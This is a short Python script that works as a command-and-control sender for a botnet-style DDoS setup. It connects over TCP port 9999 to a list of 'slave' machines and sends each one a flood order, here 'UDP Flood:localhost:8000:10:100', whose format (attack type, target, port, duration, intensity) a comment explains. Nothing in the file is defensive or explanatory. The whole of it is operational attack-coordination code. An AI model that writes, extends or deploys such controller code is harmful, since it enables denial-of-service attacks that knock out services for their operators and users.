import socket

def send_command(slave_ip, command):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((slave_ip, 9999))
        sock.send(command.encode())
        sock.close()
        print(f"Command sent to {slave_ip}: {command}")
    except Exception as e:
        print(f"Failed to send command to {slave_ip}: {e}")

if __name__ == "__main__":
    slaves = ["192.168.1.2", "192.168.1.3"]  # Replace with actual slave IPs
    command = "UDP Flood:localhost:8000:10:100"  # Format: AttackType:TargetIP:Port:Duration:Intensity

    for slave in slaves:
        send_command(slave, command)